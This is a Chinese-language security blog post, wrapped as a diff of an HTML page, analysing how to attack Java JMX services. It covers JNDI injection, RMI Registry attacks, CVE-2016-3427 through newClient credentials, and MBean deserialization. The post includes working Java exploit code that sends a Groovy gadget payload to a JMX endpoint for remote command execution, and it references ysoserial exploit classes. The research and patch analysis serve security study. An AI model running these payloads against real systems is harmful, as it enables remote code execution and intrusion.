@@ -1,0 +1,779 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/ico.png">
+  <link rel="icon" href="/img/ico.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pwnull">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="有次漏洞挖掘项目中碰到了未授权JMX的情况，在复盘时发现对于整套攻击JMX服务的方式不太了解。趁着最近有时间 对JMX相关知识来次补充，遂写了此文。主要对JMX服务未鉴权时的利用方式、JMX各账户权限可对应执行的操作、Oracle官方对于漏洞的修复、鉴权后的攻击利用方式做了分析演示。在梳理完此文后基本上对攻击JMX服务有底了，也成功利用这些特性PWN掉了***产品，中间的过程也比较有趣，等有机会再">
+  
+  
+  
+  <title>Attack JMX Service的打开方式 - pwnull的自留地</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pwnull.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pwnull的自留地</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Attack JMX Service的打开方式"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-19 10:00" pubdate>
+          2022-11-19
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          149 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Attack JMX Service的打开方式</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>有次漏洞挖掘项目中碰到了未授权JMX的情况，在复盘时发现对于整套攻击JMX服务的方式不太了解。趁着最近有时间 对JMX相关知识来次补充，遂写了此文。主要对JMX服务未鉴权时的利用方式、JMX各账户权限可对应执行的操作、Oracle官方对于漏洞的修复、鉴权后的攻击利用方式做了分析演示。在梳理完此文后基本上对攻击JMX服务有底了，也成功利用这些特性PWN掉了***产品，中间的过程也比较有趣，等有机会再做分享…</p>
+<h2 id="1、基础知识"><a href="#1、基础知识" class="headerlink" title="1、基础知识"></a>1、基础知识</h2><p>JMX是JAVA1.5引入的新特性，全称为Java Management Extension，即Java管理扩展，是管理&#x2F;监控应用程序、设备、系统对象的工具。这些被管理的对象都可以抽象为MBean进行表示，客户端连接到服务端来管理MBean，如查询MBean属性、调用MBean方法等操作。而MBean的代码定义是有要求的，需要实现一个接口，所有需要对外公开的方法都需要在该接口中声明。另外此接口要求在MBean类名后加上MBean后缀，这里例子中的MBean类是Hello，接口为HelloMBean</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//Hello.java</span><br>package org.<span class="hljs-property">example</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloMBean</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> newName</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = newName;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello: &quot;</span> + name;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>HelloMBean接口：</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//HelloMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloMBean</span> </span>&#123;<br>    <span class="hljs-comment">// getter and setter for the attribute &quot;name&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> getName();<br>    <span class="hljs-keyword">public</span> void setName(<span class="hljs-keyword">String</span> <span class="hljs-keyword">new</span><span class="hljs-type">Name</span>);<br>    <span class="hljs-comment">// Bean method &quot;sayHello&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> sayHello();<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>对于管理器而言，这些MBean中公开的方法，最终会被JMX转化为属性（ Attribute ）、调用（ Invoke ）、监听（ Listener ）等概念。默认情况下每个Java进程都运行着MBean管理服务，使用<code>ManagementFactory.getPlatformMBeanServer()</code>获取到MBeanServer后可对MBean进行操作。下面的例子模拟管理器注册MBean并显示当前java进程中的所有MBean</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果想让我们的MBean在管理器上可调用，那么需要指定一个<code>ObjectName</code>对象，关于对象名称的详细语法可参考：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html%E3%80%82">https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html。</a></p>
+<p> Object Name 在注册MBean时用于指定名称，在查询的时候可以指定正则用于查询，去匹配名称符合正则条件的MBean。每个Object Name都需要包含一个type关键属性</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//MBeanExample.java<br>package org.example;<br><br><span class="hljs-keyword">import</span> javax.management.MBeanServer;<br><span class="hljs-keyword">import</span> javax.management.ObjectInstance;<br><span class="hljs-keyword">import</span> javax.management.ObjectName;<br><span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> MBeanExample &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>        // <span class="hljs-keyword">Create</span> a <span class="hljs-built_in">new</span> MBean instance <span class="hljs-keyword">from</span> Hello (HelloMBean interface)<br>        Hello mbean = <span class="hljs-built_in">new</span> Hello();<br>        // <span class="hljs-keyword">Create</span> an <span class="hljs-keyword">object</span> <span class="hljs-type">name</span>,<br>        ObjectName mbeanName = <span class="hljs-built_in">new</span> ObjectName(&quot;org.example.Hello:type=HelloMBean&quot;);<br>        // <span class="hljs-keyword">Connect</span> <span class="hljs-keyword">to</span> the MBean <span class="hljs-keyword">server</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">current</span> Java process<br>        MBeanServer <span class="hljs-keyword">server</span> = ManagementFactory.getPlatformMBeanServer();<br>        <span class="hljs-keyword">server</span>.registerMBean(mbean, mbeanName);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span> : <span class="hljs-keyword">server</span>.queryMBeans(<span class="hljs-built_in">new</span> ObjectName(&quot;*:*&quot;), <span class="hljs-keyword">null</span>))<br>        &#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println( ((ObjectInstance)<span class="hljs-keyword">object</span>).getObjectName() );<br>        &#125;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Press any key to exit&quot;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用jconsole连接本地的org.example.MBeanExample类起的9052进程后，可以设置MBean的属性&#x2F;调用方法，如我们这里的sayHello()方法</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用sayHello()方法</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>也可以开启远程服务，将Hello、HelloMBean、MBeanExample打包为jmxserver.jar包后，用如下命令开启调试功能、JMX监听端口并设置非认证。这里为演示命令执行的效果，将groovy-2.3.9.jar添加到classpath中，方便我们后续利用Groovy Gadget</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span>  -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用nmap扫描其端口可以看到，2222端口MBean管理服务实际上是基于RMI Registry的，对象名称为jmxrmi，stub端口为56139</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="2、攻击JMX"><a href="#2、攻击JMX" class="headerlink" title="2、攻击JMX"></a>2、攻击JMX</h2><p>我们按照整体调用流程、过程中存在的利用点、官方对漏洞的修复措施及后续利用进行分析，也为了方便理解，个人将攻击JMX服务分为5种利用方式：</p>
+<p>1、jmx-url连接地址可控的JNDI注入利用方式</p>
+<p>2、攻击RMI Registry的利用方式</p>
+<p>3、RMI层”自定义”方法newClient利用方式</p>
+<p>4、JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式</p>
+<p>5、MLET动态加载Evil MBean的利用方式</p>
+<p>第一种是针对JMX客户端的利用方式，也捎带看一下。后面几种都是针对JMX服务，其中234都需要目标ClassPath存在可用的Gadget链，而第5个MLET动态加载是载入执行攻击者创建的恶意MBean类方法，所以没有Gadget的限制。从整体看，JMX客户端与服务端交互的流程及利用点如下:</p>
+<p>1、客户端使用javax.naming.InitialContext#lookup获取到名称为”jmxrmi”的 Stub代理对象，<strong>当JMX url可控时，会造成JNDI注入的问题</strong>。这是第一个利用点</p>
+<p>2、客户端调用javax.management.remote.rmi.RMIServer#newClient去获取RMIConnectionImpl Stub代理对象。当JMX服务需要验证时，会使用JAAS-based authenticator进行权限校验：根据服务的启动参数及jmxremote.password、jmxremote.access配置文件去匹配，当校验通过后返回代理对象。<br>这部分会涉及两个利用点：<br>a、JMX底层是依据RMI进行通信，当JDK版本在低版本时，可以使用攻击RMI Registry的exp进行攻击，<strong>可利用bind&#x2F;lookup方法传输恶意序列数据&#x2F;UnicastRef链利用</strong>。这是第二个利用点<br>b、newClient方法符合我们在攻击RMI中提到的<strong>应用层反序列化问题</strong>情况，参数为Object类型，可以塞入我们的恶意Padyload数据。这是第三个利用点</p>
+<p>3、客户端invoke调用RMIConnectionImpl Stub代理对象的方法去操作MBean&#x2F;获取MBean信息<br>这部分会涉及两个攻击点：<br>a、JMX层在<strong>还原MBean方法参数时也是采用反序列化方式</strong>进行还原的，所以可将恶意数据塞入默认MBean的有参方法。这是第四个利用点<br>b、在客户端连接成功创建MBean时，<strong>可调用MLET动态加载的方式去加载攻击者构建的Evil MBean完成利用</strong>。这是第五个利用点</p>
+<p>下面是详细分析及密码验证后的绕过方式</p>
+<h3 id="2-1-jmx-url连接地址可控的JNDI注入利用方式"><a href="#2-1-jmx-url连接地址可控的JNDI注入利用方式" class="headerlink" title="2.1 jmx-url连接地址可控的JNDI注入利用方式"></a>2.1 jmx-url连接地址可控的JNDI注入利用方式</h3><p>使用Java代码JMXConnectorFactory#connect连接JMX服务端时，会调用到InitialContext#lookup去获取名称为”jmxrmi”的远端对象。当JMX url可控时，会造成JNDI注入的问题，调用栈及演示如下</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">JMX JNDI Gadget:<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.JMXConnectorFactory</span><span class="hljs-selector-class">.connect</span>(JMXConnectorFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">270</span>)<br>	javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.connect</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">287</span>)<br>		javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServer</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1922</span>)<br>			javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServerJNDI</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1955</span>)<br>				javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.InitialContext</span><span class="hljs-selector-class">.lookup</span>(InitialContext<span class="hljs-selector-class">.java</span>:<span class="hljs-number">417</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>起个恶意LDAP服务，javaReferenceAddress放置我们的Groovy1链的Padyload，可以看到JMX客户端在JDK高版本的情况下成功触发命令执行。绕过原理见先前文章：<a href="https://pwnull.github.io/jndi-injection-history/">当我们谈论JNDI注入时，我们在谈论什么</a></p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>JMX JNDI注入调用栈：</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/8.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-2-攻击RMI-Registry的利用方式"><a href="#2-2-攻击RMI-Registry的利用方式" class="headerlink" title="2.2 攻击RMI Registry的利用方式"></a>2.2 攻击RMI Registry的利用方式</h3><p>因为JMX底层也是依据RMI进行通信，所以当JDK版本在低版本时，也可以使用攻击RMI Registry的exp进行攻击。且这种攻击方式的触发点是在RMI层，还未执行到JMX权限校验部分，所以不受JMX权限的限制</p>
+<p>JEP290前的JDK8u112版本，使用默认ysoserial中的ysoserial.exploit.RMIRegistryExploit测试成功</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>JEP290后的JDK131版本使用 UnicastRef 链绕过成功、141可使用改造后的lookup()+UnicastRef 链进行绕过</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>测试JDK191版本下，在sun.management.jmxremote.SingleEntryRegistry#singleRegistryFilter触发检查，导致反序列化失败。</p>
+<p>JMX服务端调试情况，在singleRegistryFilter触发白名单检查报错</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>攻击端：</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/12.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-3-RMI层”自定义”方法newClient利用方式-CVE-2016-3427"><a href="#2-3-RMI层”自定义”方法newClient利用方式-CVE-2016-3427" class="headerlink" title="2.3 RMI层”自定义”方法newClient利用方式-CVE-2016-3427"></a>2.3 RMI层”自定义”方法newClient利用方式-CVE-2016-3427</h3><p>当客户端使用<code>JMXConnectorFactory.connect</code>去连接服务端时，最终调用到<code>javax.management.remote.rmi.RMIServerImpl_Stub#newClient</code>发起连接。其实该方法符合我们在攻击RMI Registry中提到的“应用层反序列化问题”情况：newClient方法参数为Object类型，可以塞入我们的恶意Padyload（利用JMXConnector.CREDENTIALS配置添加），exp如下</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>    <span class="hljs-keyword">Object</span> obj = <span class="hljs-built_in">new</span> Groovy1().getObject(&quot;calc&quot;);<br>    connectWithJmxUrlByObject(obj);<br>&#125;<br><br>private static <span class="hljs-type">void</span> connectWithJmxUrlByObject(<span class="hljs-keyword">Object</span> credentials) throws MalformedURLException, IOException &#123;<br>    String url = &quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;;<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Trying to connect to &quot; + url + &quot; ...&quot;);<br>    Map&lt;String, <span class="hljs-keyword">Object</span>&gt; props = <span class="hljs-built_in">new</span> HashMap&lt;&gt;();<br>    props.put(JMXConnector.CREDENTIALS, credentials);<br>    JMXConnector connector = JMXConnectorFactory.<span class="hljs-keyword">connect</span>(<span class="hljs-built_in">new</span> JMXServiceURL(url), props);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Connected: &quot; + connector.getConnectionId());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println();<br>    connector.<span class="hljs-keyword">close</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功在JDK8u77-JMX服务上执行成功：</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>该漏洞在JDK8u91时被修复，新增了javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper类继承自DeserializationChecker接口，该类实现了check、checkProxyClass方法检查参数类型，限制只能为[Ljava.lang.String;、java.lang.String类型。</p>
+<p>在该版本的环境下，RMI层使用sun.rmi.server.UnicastServerRef#unmarshalParameters方法还原”自定义方法”参数时，由于jmx服务注册Target的weakImpl#referent为ExportedWrapper，所以在还原操作时会调用到ExportedWrapper#check检查序列化是否在白名单中，很显然Groovy1外部包装类AnnotationInvocationHandler不在白名单中，反序列化操作报错</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper实现DeserializationChecker接口</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/15.png" srcset="/img/loading.gif" lazyload></p>
+<p>JMX服务端调用sun.rmi.server.UnicastServerRef#unmarshalParameters还原newClient的参数：由于实现了DeserializationChecker接口，所以会走checked流程。普通RMI服务的自定义方法会走unchecked流程</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>服务端执行反序列化操作还原参数检查白名单：javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#check</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/17.png" srcset="/img/loading.gif" lazyload></p>
+<p>此漏洞被分配编号<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427">CVE-2016-3427</a>，在JDK8u91时被<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/8u91-relnotes.html">修复</a></p>
+<h3 id="2-4-JMX层MBean方法getLoggerLevel-x2F-gcClassHistogram利用方式"><a href="#2-4-JMX层MBean方法getLoggerLevel-x2F-gcClassHistogram利用方式" class="headerlink" title="2.4 JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式"></a>2.4 JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式</h3><p>当JMX客户端调用createMBean&#x2F;getObjectInstance&#x2F;invoke等方法时，服务端处理时会先经过sun.rmi.server.UnicastServerRef#dispatch进行分发，当不执行RMI内置的bind&#x2F;lookup&#x2F;dirty方法时，会进入”调用自定义方法”的逻辑</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>客户端调用createMBean&#x2F;getAttribute等内置方法时，服务端到达javax.management.remote.rmi.RMIConnectionImpl#invoke中：</p>
+<p>1、调用java.rmi.MarshalledObject#get还原参数值</p>
+<p>2、调用到javax.management.remote.rmi.RMIConnectionImpl#doOperation根据客户端调用具体方法进行分发处理，包括createMBean、getAttribute、getObjectInstance、getObjectInstance等方法</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/19.png" srcset="/img/loading.gif" lazyload></p>
+<p>java.rmi.MarshalledObject#get</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/20.png" srcset="/img/loading.gif" lazyload></p>
+<p>javax.management.remote.rmi.RMIConnectionImpl#doOperation</p>
+<p><img src="/img/How-to-attack-RMI-based-JMX-services/21.png" srcset="/img/loading.gif" lazyload></p>
+<p>在使用java.rmi.MarshalledObject#get还原调用方法的参数值时，会直接调用readObject进行反序列化操作。我们只需要找到MBean中带参数的方法，将我们的恶意数据填充即可，对应exp为ysoserial中的ysoserial.exploit.JMXInvokeMBean，该exp通过调用对象名称为”java.util.logging:type&#x3D;Logging”的MBean的getLoggerLevel方法触发</p>
